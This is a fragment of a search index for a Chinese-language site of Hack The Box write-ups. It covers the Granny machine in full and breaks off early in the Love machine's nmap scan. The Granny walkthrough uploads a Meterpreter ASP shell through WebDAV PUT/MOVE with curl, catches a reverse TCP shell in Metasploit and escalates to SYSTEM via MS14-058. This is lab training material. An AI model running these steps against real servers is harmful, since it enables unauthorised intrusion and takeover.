<p></p>"},{"location":"CTF/HTB/Windows-Granny/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Granny/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.15 -oA scans/ports\n...\nPORT   STATE SERVICE\n80/tcp open  http\n...\nroot@kali# nmap -sT -sC -sV -O -p80 10.10.10.15 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods:\n|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan:\n|   WebDAV type: Unkown\n|   Server Type: Microsoft-IIS/6.0\n|   Server Date: Wed, 06 Mar 2019 20:13:57 GMT\n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                             \nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n...\n</code></pre> <p>1.nmap\u626b\u63cf\u53d1\u73b0\u53ea\u5f00\u4e8680\u7aef\u53e3\uff0c\u7248\u672c\u662f\uff1aMicrosoft IIS version 6.0\u2026 2.\u8fd8\u542f\u7528\u4e86http-webdav\u2026 3.\u53d1\u73b0\u670d\u52a1\u5668\u662fiis6.0\uff0c\u90a3\u4e48\u6211\u4eec\u63a8\u6d4b\u5bf9\u65b9\u670d\u52a1\u5668\u7cfb\u7edf\u7248\u672c\u5927\u6982\u662fwin2003\u4e4b\u524d\u7684\u7cfb\u7edf</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#web","title":"WEB\u670d\u52a1","text":""},{"location":"CTF/HTB/Windows-Granny/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>\u7528dirsearch\u626b\u4e00\u4e0b\u654f\u611f\u76ee\u5f55</p> <pre><code>root@kali# python3.9 dirsearch.py -u http://10.10.10.15            \n...\n[10:32:59] 301 -  153B  - /_private  -&gt;  http://10.10.10.15/%5Fprivate/     \n[10:32:59] 200 -  246B  - /_private/                                        \n[10:33:00] 301 -  155B  - /_vti_bin  -&gt;  http://10.10.10.15/%5Fvti%5Fbin/   \n[10:33:00] 200 -  759B  - /_vti_bin/\n[10:33:00] 200 -  195B  - /_vti_bin/_vti_aut/author.dll                     \n[10:33:00] 200 -   96B  - /_vti_bin/shtml.dll\n[10:33:00] 200 -   96B  - /_vti_bin/shtml.exe?_vti_rpc\n[10:33:00] 200 -  106B  - /_vti_bin/shtml.exe/qwertyuiop\n[10:33:00] 200 -  105B  - /_vti_bin/shtml.dll/asdfghjkl\n[10:33:00] 200 -  246B  - /_vti_log/                                        \n[10:33:00] 500 -   88B  - /_vti_pvt/users.pwt                               \n[10:33:00] 301 -  155B  - /_vti_log  -&gt;  http://10.10.10.15/%5Fvti%5Flog/   \n[10:33:00] 500 -   88B  - /_vti_pvt/users.pwd\n[10:33:01] 500 -   88B  - /_vti_cnf/                                        \n[10:33:01] 200 -    2KB - /_vti_inf.html                                    \n[10:33:01] 200 -  195B  - /_vti_bin/_vti_adm/admin.dll\n\n[10:34:29] 200 -  369B  - /aspnet_client/                                   \n[10:34:29] 301 -  158B  - /aspnet_client  -&gt;  http://10.10.10.15/aspnet%5Fclient/\n\n[10:36:14] 200 -  242B  - /images/                                          \n[10:36:14] 301 -  149B  - /images  -&gt;  http://10.10.10.15/images/           \n[10:37:47] 200 -    2KB - /postinfo.html                                    \n...\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u4e86\u6709iis6.0\u4e2d\u95f4\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u641c\u7d22\u4e00\u4e0b\u6709\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e.</p> <p></p> <p>WebDAV\u662f\u4e00\u79cd\u57fa\u4e8eHTTP\u534f\u8bae\u7684\u6269\u5c55\uff0c\u5b83\u5141\u8bb8\u5ba2\u6237\u7aef\u5bf9\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\uff0c\u7c7b\u4f3c\u4e8e\u4f20\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\u3002\u5176\u5168\u79f0\u662f\u201cWeb-based Distributed Authoring and Versioning\u201d\uff0c\u5373\u57fa\u4e8eWeb\u7684\u5206\u5e03\u5f0f\u521b\u4f5c\u548c\u7248\u672c\u63a7\u5236\u3002</p> <p>WebDAV\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u4e3b\u8981\u529f\u80fd\u548c\u670d\u52a1\uff1a</p> <ol> <li>\u6587\u4ef6\u7ba1\u7406: \u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7WebDAV\u534f\u8bae\u5bf9\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u8fdb\u884c\u521b\u5efa\u3001\u5220\u9664\u3001\u79fb\u52a8\u548c\u91cd\u547d\u540d\u7b49\u64cd\u4f5c\uff0c\u5c31\u50cf\u64cd\u4f5c\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e00\u6837\u3002</li> <li>\u6587\u4ef6\u9501\u5b9a: WebDAV\u5141\u8bb8\u5ba2\u6237\u7aef\u9501\u5b9a\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u9632\u6b62\u5176\u4ed6\u5ba2\u6237\u7aef\u5728\u8be5\u6587\u4ef6\u4e0a\u6267\u884c\u5199\u64cd\u4f5c\uff0c\u4ece\u800c\u5b9e\u73b0\u6587\u4ef6\u7684\u534f\u4f5c\u7f16\u8f91\u3002</li> <li>\u5c5e\u6027\u7ba1\u7406: \u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7WebDAV\u534f\u8bae\u7ba1\u7406\u670d\u52a1\u5668\u4e0a\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u6bd4\u5982\u6587\u4ef6\u7684\u521b\u5efa\u65f6\u95f4\u3001\u4fee\u6539\u65f6\u95f4\u7b49\u3002</li> <li>\u96c6\u6210\u7248\u672c\u63a7\u5236: WebDAV\u652f\u6301\u4e00\u4e9b\u7248\u672c\u63a7\u5236\u529f\u80fd\uff0c\u5141\u8bb8\u5bf9\u6587\u4ef6\u8fdb\u884c\u7248\u672c\u7ba1\u7406\uff0c\u5305\u62ec\u521b\u5efa\u3001\u67e5\u770b\u548c\u8fd8\u539f\u6587\u4ef6\u7684\u4e0d\u540c\u7248\u672c\u3002</li> <li>\u8fdc\u7a0b\u6587\u4ef6\u8bbf\u95ee: \u7528\u6237\u53ef\u4ee5\u901a\u8fc7WebDAV\u534f\u8bae\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u8bbf\u95ee\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u4f7f\u7528\u4e13\u95e8\u7684\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\u6216\u5de5\u5177\u3002</li> <li>\u7f51\u7edc\u6587\u4ef6\u5171\u4eab: WebDAV\u53ef\u7528\u4e8e\u521b\u5efa\u57fa\u4e8e\u7f51\u7edc\u7684\u6587\u4ef6\u5171\u4eab\u7cfb\u7edf\uff0c\u5141\u8bb8\u591a\u4e2a\u7528\u6237\u534f\u540c\u5de5\u4f5c\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e73\u53f0\u4e0a\u5b9e\u73b0\u4e92\u64cd\u4f5c\u6027\u3002</li> </ol> <p>\u603b\u7684\u6765\u8bf4\uff0cWebDAV\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b9\u4fbf\u7684\u65b9\u5f0f\uff0c\u4f7f\u7528\u6237\u80fd\u591f\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u548c\u7ba1\u7406\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u540c\u65f6\u652f\u6301\u4e00\u4e9b\u534f\u4f5c\u548c\u7248\u672c\u63a7\u5236\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u8bb8\u591a\u4e0d\u540c\u7684\u5e94\u7528\u573a\u666f\uff0c\u5982\u4e91\u5b58\u50a8\u3001\u6587\u6863\u7ba1\u7406\u7cfb\u7edf\u3001\u534f\u4f5c\u7f16\u8f91\u7b49\u3002</p> <p>\u770b\u5230\u4e86\u5173\u4e8eIIS\u7684webdav\u7684\u6f0f\u6d1e.</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u68c0\u67e5\u54cd\u5e94\u6807\u5934\uff1a</p> <pre><code>root@kali# curl -I 10.10.10.15\nHTTP/1.1 200 OK\nContent-Length: 1433\nContent-Type: text/html\nContent-Location: http://10.10.10.15/iisstart.htm\nLast-Modified: Fri, 21 Feb 2003 15:48:30 GMT\nAccept-Ranges: bytes\nETag: \"05b3daec0d9c21:358\"\nServer: Microsoft-IIS/6.0\nMicrosoftOfficeWebServer: 5.0_Pub\nX-Powered-By: ASP.NET\nDate: Wed, 06 Mar 2019 20:15:03 GMT\nConnection: close\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6807\u5934\u6b63\u5728\u4f7f\u7528ASP.NET</p> <p>\u57fa\u672c\u7684Web\u5f00\u53d1\u7f51\u7ad9\u7684\u5806\u6808\u7ed3\u6784\u5982\u4e0b\uff1a LAMP = Linux + Apache + MySQL + PHP WISA = Windows + IIS + SQL Server + ASP.NET</p> <p>\u8fd9\u4e2a\u9776\u673a\u662fwindows\u73af\u5883\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528ASP.NET\u6765\u66ff\u4ee3PHP\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\u6765\u5c06\u6587\u4ef6\u4ee5asp/aspx\u6269\u5c55\u540d\u4f20\u9012\u5230\u670d\u52a1\u5668\u63d0\u6743\u5373\u53ef\u2026\uff08\u5c31\u662f\u5c06\u5408\u6cd5\u6587\u4ef6\u4e0a\u4f20\u5230Web\u670d\u52a1\u5668\uff0c\u7136\u540e\u5c06\u5176\u91cd\u547d\u540d\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5c06\u6269\u5c55\u540d\u66f4\u6539\u4e3aasp\u6216aspx\uff09</p> <p>\u9a8c\u8bc1\u4e0b\u6211\u7684\u601d\u8def\u662f\u4e0d\u662f\u5bf9\u7684\u2026</p> <p>\u5728nmap\u626b\u63cf\u4e2d\u6ce8\u610f\u5230 webdav \u626b\u63cf\u663e\u793a\u4e86 PUT \u548c MOVE \u7b49\u65b9\u6cd5\u3002\u6211\u4e5f\u8bb8\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6\u3002</p> <pre><code>| http-webdav-scan:\n|   WebDAV type: Unkown\n|   Server Type: Microsoft-IIS/6.0\n|   Server Date: Wed, 06 Mar 2019 20:13:57 GMT\n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH  \n</code></pre>"},{"location":"CTF/HTB/Windows-Granny/index.html#davtest","title":"DAVTEST\u6d4b\u8bd5","text":"<p>WebDAV\u662f\u57fa\u4e8eWeb\u670d\u52a1\u7684\u6269\u5c55\u670d\u52a1\u3002\u5b83\u5141\u8bb8\u7528\u6237\u50cf\u64cd\u4f5c\u672c\u5730\u6587\u4ef6\u4e00\u6837\uff0c\u64cd\u4f5c\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002\u501f\u52a9\u8be5\u529f\u80fd\uff0c\u7528\u6237\u5f88\u65b9\u4fbf\u7684\u5728\u7f51\u7edc\u4e0a\u5b58\u50a8\u81ea\u5df1\u7684\u6587\u4ef6\u3002\u4e3a\u4e86\u65b9\u4fbf\u7528\u6237\u4f7f\u7528\uff0c\u901a\u5e38\u4f1a\u63d0\u4f9b\u7ed9\u7528\u6237\u8f83\u5927\u7684\u6587\u4ef6\u6743\u9650\uff0c\u5982\u4e0a\u4f20\u3001\u4fee\u6539\u751a\u81f3\u662f\u6267\u884c\u6743\u9650\u3002Kali Linux\u63d0\u4f9b\u4e86\u4e00\u6b3eWebDAV\u670d\u52a1\u6f0f\u6d1e\u5229\u7528\u5de5\u5177DAVTest\u3002\u8be5\u5de5\u5177\u4f1a\u81ea\u52a8\u68c0\u6d4b\u6743\u9650\uff0c\u5bfb\u627e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u3002\u4e00\u65e6\u53d1\u73b0\uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u4e0a\u4f20\u5185\u7f6e\u7684\u540e\u95e8\u5de5\u5177\uff0c\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u63a7\u5236\u3002\u540c\u65f6\uff0c\u8be5\u5de5\u5177\u53ef\u4ee5\u4e0a\u4f20\u7528\u6237\u6307\u5b9a\u7684\u6587\u4ef6\uff0c\u4fbf\u4e8e\u540e\u671f\u5229\u7528\u3002</p> <p>davtest\u4f7f\u7528\u6559\u7a0b\uff1ahttps://blog.csdn.net/qq_40399982/article/details/112583196</p> <p>\u5b83\u5c06\u5411\u6211\u663e\u793a\u53ef\u4ee5\u4e0a\u4f20\u54ea\u4e9b\u7c7b\u578b\u7684\u6587\u4ef6\uff0c\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u521b\u5efa\u76ee\u5f55\uff1adavtest</p> <pre><code>root@kali# davtest -url http://10.10.10.15\n...\n********************************************************\n Sending test files\nPUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt\nPUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp\nPUT     asp     FAIL\nPUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php\nPUT     cgi     FAIL\nPUT     aspx    FAIL\nPUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl\nPUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm\nPUT     shtml   FAIL\nPUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml\nPUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html\n********************************************************\n Checking for test file execution\nEXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt\nEXEC    jsp     FAIL\nEXEC    php     FAIL\nEXEC    pl      FAIL\nEXEC    cfm     FAIL\nEXEC    jhtml   FAIL\nEXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html\n\n********************************************************\n/usr/bin/davtest Summary:\nCreated: http://10.10.10.15/DavTestDir_l8Qkwc\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml\nPUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html\nExecutes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt\nExecutes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html\n...\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6587\u672c\u6587\u4ef6\u662f\u6210\u529f\u4e0a\u4f20\u52a0\u8f7d\u7684\u2026</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#meterpreter","title":"Meterpreter","text":"<p>\u5229\u7528msfvenom\u751f\u6210asp shell\uff0c\u7136\u540e\u4e0a\u4f20\u5230Web\u670d\u52a1\u5668\u5373\u53ef</p> <p></p> <p>\u6709\u4e24\u79cd\u4e0a\u4f20\u65b9\u5f0f\uff1a</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#curl","title":"curl","text":"<pre><code>root@kali# curl -X PUT http://10.10.10.15/met.txt -d @met.aspx \nroot@kali# curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt\n</code></pre>"},{"location":"CTF/HTB/Windows-Granny/index.html#cadaver","title":"\u7ed3\u5408cadaver","text":"<p>cadaver\uff1aWEBDAV\u662f\u57fa\u4e8eHTTP 1.1\u7684\u6269\u5c55\u534f\u8bae\uff0c\u5176\u652f\u6301\u4f7f\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u548c\u9501\u5b9a\u6587\u4ef6\uff0c\u57fa\u4e8e\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u5b9e\u73b0\u529f\u80fd\u5f3a\u5927\u7684\u5185\u5bb9\u6216\u914d\u7f6e\u7ba1\u7406\u7cfb\u7edf\u3002\u4f46\u4e30\u5bcc\u7684\u529f\u80fd\u7279\u6027\u603b\u662f\u4f1a\u5e26\u6765\u5b89\u5168\u65b9\u9762\u7684\u66f4\u591a\u9690\u60a3\uff0c\u5c24\u5176\u662f\u5728\u914d\u7f6e\u4e0d\u5f53\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u76f4\u63a5\u7ed9\u653b\u51fb\u8005\u7559\u4e0b\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u5165\u53e3\u3002davtest\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u68c0\u6d4b\u548c\u9a8c\u8bc1\u5de5\u5177\uff0c\u800ccadaver\u4f5c\u4e3a\u4e00\u4e2a\u547d\u4ee4\u884c\u5f62\u5f0f\u7684WEBDAV\u5ba2\u6237\u7aef\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5bf9\u76f8\u5e94\u670d\u52a1\u5668\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002</p> <p>cadaver\u4f7f\u7528\u6559\u7a0b\uff1ahttps://www.shserve.cn/18422.html</p> <p></p> <p>\u5c06asp\u5185\u5bb9\u590d\u5236\u5230txt\u6587\u672c\u4e2d\u2026</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u901a\u8fc7put\u4e0a\u4f20\u6587\u4ef6\uff0c\u7136\u540emove\u91cd\u540d\u4e86\u6587\u4ef6\uff0c\u5373\u53ef\u3002</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>curl\u7684\u65b9\u5f0f\u6709\u4e9b\u95ee\u9898\uff0c\u542f\u52a8 Metasploit\u540e\u5931\u8d25\uff1a</p> <pre><code>msf5 &gt; use exploit/multi/handler \nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set LHOST tun0\nLHOST =&gt; tun0\nmsf5 exploit(multi/handler) &gt; set lport 443\nlport =&gt; 443\nmsf5 exploit(multi/handler) &gt; options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun0             yes       The listen address (an interface may be specified)\n   LPORT     443              yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\nmsf5 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.10.14.14:443 \n</code></pre> <p>\u89e6\u53d1\u5931\u8d25\u4e86\uff1a</p> <p></p> <p>\u67e5\u770b\u4e0a\u4f20\u7684met.txt\u6587\u4ef6\uff1a</p> <p></p> <p>\u53d1\u73b0\u683c\u5f0f\u6709\u95ee\u9898\uff0c\u91cd\u65b0\u4e0a\u4f20\uff0c\u8fd9\u6b21\u7528\u4e8e\u4fdd\u7559\u7aef\u884c\u548c\u5176\u4ed6\u63a7\u5236\u5b57\u7b26\uff1a--data-binary\u3002</p> <p>--data-binary\uff1a\u544a\u8bc9curl\u5c06\u6570\u636e\u89c6\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u800c\u4e0d\u8fdb\u884c\u4efb\u4f55\u7279\u6b8a\u5904\u7406\u3002\u8fd9\u610f\u5473\u7740\u4e0a\u4f20\u7684\u6570\u636e\u5c06\u6309\u7167\u539f\u59cb\u683c\u5f0f\u8fdb\u884c\u4f20\u8f93\uff0c\u4e0d\u4f1a\u5bf9\u5176\u8fdb\u884c\u5b57\u7b26\u7f16\u7801\u7b49\u5904\u7406\u3002</p> <p>-d\uff1a\u544a\u8bc9curl\u4f7f\u7528\u6807\u51c6\u7684URL\u7f16\u7801\u683c\u5f0f\u5c06\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u8fd9\u610f\u5473\u7740\u4e0a\u4f20\u7684\u6570\u636e\u5c06\u6309\u7167URL\u7f16\u7801\u683c\u5f0f\u8fdb\u884c\u4f20\u8f93\uff0c\u5176\u4e2d\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u53ef\u80fd\u4f1a\u88ab\u8f6c\u4e49\u3002</p> <p></p> <p>\u6ca1\u6709\u95ee\u9898\u4e86\u3002</p> <p>\u73b0\u5728\uff0c\u79fb\u52a8\u6587\u4ef6\u5e76\u89e6\u53d1\u5b83\uff1a</p> <pre><code>root@kali# curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt \nroot@kali# curl http://10.10.10.15/met.aspx\n</code></pre> <p>\u6210\u529f\u62ff\u5230shell\u3002</p> <pre><code>[*] Sending stage (179779 bytes) to 10.10.10.15\n[*] Meterpreter session 1 opened (10.10.14.14:443 -&gt; 10.10.10.15:1032) at 2019-03-06 17:05:07 -0500\n\nmeterpreter &gt;\n</code></pre> <p>\u4e0d\u4f7f\u7528msf\uff0c\u53ef\u4ee5\u672c\u5730\u76f4\u63a5nc\u76d1\u542c\u3002</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#_3","title":"\u63d0\u6743","text":""},{"location":"CTF/HTB/Windows-Granny/index.html#_4","title":"\u7528\u672c\u5730\u6f0f\u6d1e\u5229\u7528\u68c0\u67e5","text":"<pre><code>meterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; search local_exploit\n\nMatching Modules\n================\n\n   Name                                      Disclosure Date  Rank    Check  Description\n   ----                                      ---------------  ----    -----  -----------\n   post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester\n\n\nmsf5 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester\nmsf5 post(multi/recon/local_exploit_suggester) &gt; set session 1\nsession =&gt; 1\nmsf5 post(multi/recon/local_exploit_suggester) &gt; run\n\n[*] 10.10.10.15 - Collecting local exploits for x86/windows...\n[*] 10.10.10.15 - 29 exploit checks are being tried...\n[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.\n[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.\n[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.\n[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[*] Post module execution completed\n</code></pre> <p>\u8fd9\u91cc\u5229\u7528use post/multi/recon/local_exploit_suggester\uff0c\u8fd9\u4e2a\u662fMetasploit\u4e2d\u4f7f\u7528\u672c\u5730\u6f0f\u6d1e\u5229\u7528\u68c0\u67e5\u6765\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u672c\u5730\u6f0f\u6d1e\uff0c\u5c31\u548c\u6f0f\u626b\u811a\u672c\u5dee\u4e0d\u591a\uff0c\u5f88\u597d\u7684\u4e00\u4e2a\u811a\u672c\u3002\u8fd9\u91cc\u53d1\u73b0\u4e867\u4e2a\u6210\u529f\u7387\u9ad8\u7684\u6f0f\u6d1e\uff0c\u90fd\u662f\u53ef\u4ee5\u6210\u529f\u7684\uff0c\u5229\u7528\u5c31\u884c\u3002</p>"},{"location":"CTF/HTB/Windows-Granny/index.html#ms14-058","title":"\u5c1d\u8bd5MS14-058","text":"<pre><code>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms14_058_track_popup_menu\nmsf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; set session 1\nsession =&gt; 3                                 \nmsf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.14:4444\n[*] Launching notepad to host the exploit...\n[+] Process 2304 launched.\n[*] Reflectively injecting the exploit DLL into 2304...\n[*] Injecting exploit into 2304...\n[*] Exploit injected. Injecting payload into 2304...\n[*] Payload injected. Executing exploit...        \n[*] Sending stage (179779 bytes) to 10.10.10.15\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Meterpreter session 4 opened (10.10.14.14:4444 -&gt; 10.10.10.15:1044) at 2019-03-06 17:20:47 -0500\n\nmeterpreter &gt; getuid            \nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"CTF/HTB/Windows-Love/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Love/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.239 -oA scans/ports\n...\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n443/tcp   open  https\n445/tcp   open  microsoft-ds\n3306/tcp  open  mysql\n5000/tcp  open  upnp\n5040/tcp  open  unknown\n5985/tcp  open  wsman\n5986/tcp  open  wsmans\n7680/tcp  open  pando-pub\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n...\nroot@kali# nmap -sT -sC -sV -O -p80,135,139,443,445,3306,5000,5040,5985,5986,7680 10.10.10.239 -oA scans/details\n...\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: Voting System using PHP\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 403 Forbidden\n| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in\n| Not valid before: 2021-01-18T14:00:16\n|_Not valid after:  2022-01-18T14:00:16\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n3306/tcp open  mysql?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: \n|_    Host '10.10.14.6' is not allowed to connect to this MariaDB server\n5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 403 Forbidden\n5040/tcp open  unknown\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n5986/tcp open  ssl/http     Microsoft 